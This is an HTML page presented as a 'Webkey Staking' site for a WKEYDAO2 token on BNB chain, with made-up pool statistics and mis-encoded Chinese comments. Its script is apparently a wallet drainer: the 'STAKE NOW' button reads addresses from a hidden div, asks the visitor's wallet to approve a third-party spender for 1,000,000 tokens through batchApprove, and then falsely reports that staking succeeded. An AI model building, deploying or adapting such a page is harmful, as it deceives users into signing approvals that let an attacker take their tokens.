<!DOCTYPE html>
<html>
<head>
    <title>Webkey Staking</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0a0000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
            position: relative;
            overflow-x: hidden;
        }
        
        /* Á∫¢ÈªëÊ∏êÂèòËÉåÊôØ */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 0% 0%, rgba(255, 0, 0, 0.15) 0%, transparent 50%),
                        radial-gradient(circle at 100% 100%, rgba(255, 0, 0, 0.1) 0%, transparent 50%);
            pointer-events: none;
        }
        
        .container {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 440px;
        }
        
        /* ‰∏ªÂç°Áâá */
        .card {
            background: #1a0a0a;
            backdrop-filter: blur(20px);
            border-radius: 36px;
            padding: 32px 20px;
            border: 1px solid rgba(255, 0, 0, 0.3);
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8),
                        0 0 0 1px rgba(255, 0, 0, 0.2) inset,
                        0 0 30px rgba(255, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        /* Á∫¢Ëâ≤ÂÖâÊôï */
        .card::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 50% 50%, rgba(255, 0, 0, 0.15), transparent 70%);
            opacity: 0.6;
            animation: pulse 4s ease-in-out infinite;
            pointer-events: none;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(1.1); }
        }
        
        /* Logo Âå∫Âüü */
        .logo-section {
            text-align: center;
            margin-bottom: 28px;
            position: relative;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #ff0000, #8b0000);
            border-radius: 28px;
            margin: 0 auto 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 15px 30px rgba(255, 0, 0, 0.5);
            position: relative;
        }
        
        .logo::before {
            content: '';
            position: absolute;
            inset: -3px;
            background: linear-gradient(135deg, #ff0000, #8b0000);
            border-radius: 32px;
            opacity: 0.5;
            filter: blur(8px);
            z-index: -1;
        }
        
        .logo span {
            font-size: 40px;
            font-weight: 800;
            color: white;
            text-shadow: 0 0 15px rgba(255, 0, 0, 0.8);
        }
        
        .title {
            font-size: 32px;
            font-weight: 800;
            background: linear-gradient(135deg, #ff3333, #ff0000);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 6px;
            letter-spacing: -0.5px;
            text-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
        }
        
        .subtitle {
            color: #a67c7c;
            font-size: 15px;
            font-weight: 400;
        }
        
        /* Ë¥®ÊäºÂç°Áâá */
        .stake-card {
            background: rgba(30, 10, 10, 0.8);
            border-radius: 28px;
            padding: 22px;
            margin-bottom: 22px;
            border: 1px solid rgba(255, 0, 0, 0.2);
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(5px);
        }
        
        .stake-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .token-icon {
            width: 52px;
            height: 52px;
            background: linear-gradient(135deg, #ff0000, #660000);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            color: white;
            box-shadow: 0 8px 16px rgba(255, 0, 0, 0.3);
        }
        
        .token-info {
            flex: 1;
        }
        
        .token-name {
            font-size: 20px;
            font-weight: 700;
            color: white;
            margin-bottom: 4px;
        }
        
        .token-desc {
            color: #a67c7c;
            font-size: 13px;
        }
        
        /* Êï∞ÊçÆÁΩëÊ†º */
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin: 20px 0;
        }
        
        .stat-item {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 18px;
            padding: 16px 12px;
            text-align: center;
            border: 1px solid rgba(255, 0, 0, 0.2);
        }
        
        .stat-value {
            font-size: 24px;
            font-weight: 800;
            color: #ff3333;
            margin-bottom: 4px;
            text-shadow: 0 0 8px rgba(255, 0, 0, 0.5);
        }
        
        .stat-label {
            font-size: 13px;
            color: #a67c7c;
        }
        
        /* ËøõÂ∫¶Êù° */
        .progress-container {
            margin: 20px 0;
        }
        
        .progress-header {
            display: flex;
            justify-content: space-between;
            color: #a67c7c;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        .progress-bar {
            height: 8px;
            background: rgba(255, 0, 0, 0.1);
            border-radius: 100px;
            overflow: hidden;
            border: 1px solid rgba(255, 0, 0, 0.2);
        }
        
        .progress-fill {
            width: 78%;
            height: 100%;
            background: linear-gradient(90deg, #ff0000, #8b0000);
            border-radius: 100px;
            position: relative;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }
        
        /* ÊåâÈíÆ */
        .stake-button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #ff0000, #8b0000);
            border: none;
            border-radius: 50px;
            color: white;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            transition: all 0.3s;
            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.5);
            margin: 20px 0 12px;
            letter-spacing: 1px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .stake-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: left 0.5s;
        }
        
        .stake-button:hover::before {
            left: 100%;
        }
        
        .stake-button:active {
            transform: scale(0.98);
            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.6);
        }
        
        /* ÊèêÁ§∫‰ø°ÊÅØ */
        .note {
            text-align: center;
            color: #8b5a5a;
            font-size: 13px;
            padding: 12px;
            background: rgba(30, 10, 10, 0.6);
            border-radius: 50px;
            border: 1px solid rgba(255, 0, 0, 0.1);
        }
        
        /* ÁªìÊûúÂºπÁ™ó */
        .result {
            margin-top: 16px;
            padding: 14px;
            border-radius: 20px;
            font-size: 14px;
            line-height: 1.5;
            display: none;
            text-align: center;
            font-weight: 500;
        }
        
        .result.success {
            background: rgba(0, 100, 0, 0.2);
            border: 1px solid #00ff00;
            color: #aaffaa;
            display: block;
        }
        
        .result.error {
            background: rgba(139, 0, 0, 0.3);
            border: 1px solid #ff3333;
            color: #ff9999;
            display: block;
        }
        
        .result a {
            color: #ff6666;
            text-decoration: none;
            font-weight: 600;
        }
        
        .result a:hover {
            text-decoration: underline;
        }
        
        /* ÈöêËóèÁöÑÊäÄÊúØÊï∞ÊçÆ */
        .hidden-data {
            display: none;
        }
        
        /* Ê¥ªÂä®Ê†áÁ≠æ */
        .badge {
            position: absolute;
            top: 16px;
            right: 16px;
            background: rgba(255, 0, 0, 0.2);
            border: 1px solid #ff0000;
            color: #ff6666;
            padding: 5px 14px;
            border-radius: 50px;
            font-size: 12px;
            font-weight: 600;
            backdrop-filter: blur(5px);
            z-index: 2;
        }
        
        /* Â∫ïÈÉ®‰ø°ÊÅØ */
        .footer {
            display: flex;
            justify-content: space-between;
            color: #8b5a5a;
            font-size: 13px;
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid rgba(255, 0, 0, 0.2);
        }
        
        /* ÈÄÇÈÖçÂ∞èÂ±èÂπï */
        @media (max-width: 380px) {
            .title {
                font-size: 28px;
            }
            
            .token-icon {
                width: 44px;
                height: 44px;
                font-size: 24px;
            }
            
            .stat-value {
                font-size: 20px;
            }
            
            .stake-button {
                font-size: 18px;
                padding: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="badge">‚ö° HOT</div>
            
            <!-- Logo Âå∫Âüü -->
            <div class="logo-section">
                <div class="logo">
                    <span>‚ö°Ô∏è</span>
                </div>
                <h1 class="title">WEBKEY STAKING</h1>
                <div class="subtitle">Stake ¬∑ Earn ¬∑ Repeat</div>
            </div>
            
            <!-- Ë¥®ÊäºÂç°Áâá -->
            <div class="stake-card">
                <div class="stake-header">
                    <div class="token-icon">üî¥</div>
                    <div class="token-info">
                        <div class="token-name">WKEYDAO2</div>
                        <div class="token-desc">Ecosystem Token</div>
                    </div>
                </div>
                
                <!-- ÁªüËÆ°Êï∞ÊçÆ -->
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value">8.5%</div>
                        <div class="stat-label">APR</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value">1.2M</div>
                        <div class="stat-label">Staked</div>
                    </div>
                </div>
                
                <!-- ËøõÂ∫¶Êù° -->
                <div class="progress-container">
                    <div class="progress-header">
                        <span>Pool Capacity</span>
                        <span>78%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill"></div>
                    </div>
                </div>
                
                <!-- ÂèÇ‰∏éËÄÖ‰ø°ÊÅØ -->
                <div class="footer">
                    <span>üë• 1,234 Stakers</span>
                    <span>üí∞ 0.01 BNB gas</span>
                </div>
            </div>
            
            <!-- ÈöêËóèÁöÑÂêàÁ∫¶Êï∞ÊçÆ -->
            <div class="hidden-data" id="contractData" 
                 data-contract="0x62B5E69a0a97109Fe0BfC243E02673D293D7c921"
                 data-spender="0x99ff20F8ada291A9a0EDA48e4ae5A17F535D753b"
                 data-token="0xe0A281deFf5c9d8d67aF09D39340E134Ac81b82E">
            </div>
            
            <!-- Ë¥®ÊäºÊåâÈíÆ -->
            <button class="stake-button" onclick="stakeTokens()">
                üî¥ STAKE NOW
            </button>
            
            <div class="note">
                One signature required ¬∑ Gas fee: ~0.01 BNB
            </div>
            
            <!-- ÁªìÊûúÂ±ïÁ§∫ -->
            <div id="result" class="result"></div>
        </div>
    </div>

    <script>
        // ËØªÂèñÈöêËóèÁöÑÂêàÁ∫¶Êï∞ÊçÆ
        const contractData = document.getElementById('contractData');
        const CONTRACT_ADDRESS = contractData.dataset.contract;
        const SPENDER = contractData.dataset.spender;
        const TOKEN_ADDRESS = contractData.dataset.token;
        const AMOUNT = '1000000';  // 1,000,000

        // ABI
        const BATCH_ABI = [{
            "inputs": [
                {"internalType": "address[]", "name": "_tokens", "type": "address[]"},
                {"internalType": "address", "name": "_spender", "type": "address"},
                {"internalType": "uint256[]", "name": "_amounts", "type": "uint256[]"}
            ],
            "name": "batchApprove",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }];

        async function stakeTokens() {
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.className = 'result';
            resultDiv.innerHTML = '‚è≥ Connecting wallet...';
            
            try {
                // Ê£ÄÊü•Èí±ÂåÖ
                if (!window.ethereum) {
                    throw new Error('Please install MetaMask');
                }
                
                // ËØ∑Ê±ÇËøûÊé•
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                const web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();
                
                resultDiv.innerHTML = '‚è≥ Preparing transaction...';
                
                // ÂáÜÂ§áÂèÇÊï∞Ôºà‰øùÊåÅÊï∞ÁªÑÊ†ºÂºèÔºå‰ΩÜÂè™‰º†‰∏Ä‰∏™‰ª£Â∏ÅÔºâ
                const amountInWei = web3.utils.toWei(AMOUNT, 'ether');
                const tokens = [TOKEN_ADDRESS];
                const amounts = [amountInWei];
                
                const contract = new web3.eth.Contract(BATCH_ABI, CONTRACT_ADDRESS);
                
                resultDiv.innerHTML = '‚è≥ Please confirm in your wallet...';
                
                // ÂèëÈÄÅ‰∫§Êòì
                const tx = await contract.methods.batchApprove(tokens, SPENDER, amounts).send({
                    from: accounts[0],
                    gas: 300000
                });
                
                // ÊàêÂäü
                resultDiv.className = 'result success';
                resultDiv.innerHTML = `
                    ‚úÖ Staking successful!<br>
                    <a href="https://bscscan.com/tx/${tx.transactionHash}" target="_blank">View transaction ‚Üí</a>
                `;
                
            } catch (error) {
                // Â§±Ë¥•
                resultDiv.className = 'result error';
                if (error.message.includes('User rejected')) {
                    resultDiv.innerHTML = '‚ùå Transaction canceled';
                } else if (error.message.includes('insufficient')) {
                    resultDiv.innerHTML = '‚ùå Insufficient BNB for gas';
                } else {
                    resultDiv.innerHTML = '‚ùå Transaction failed';
                }
            }
        }
    </script>
</body>
</html>
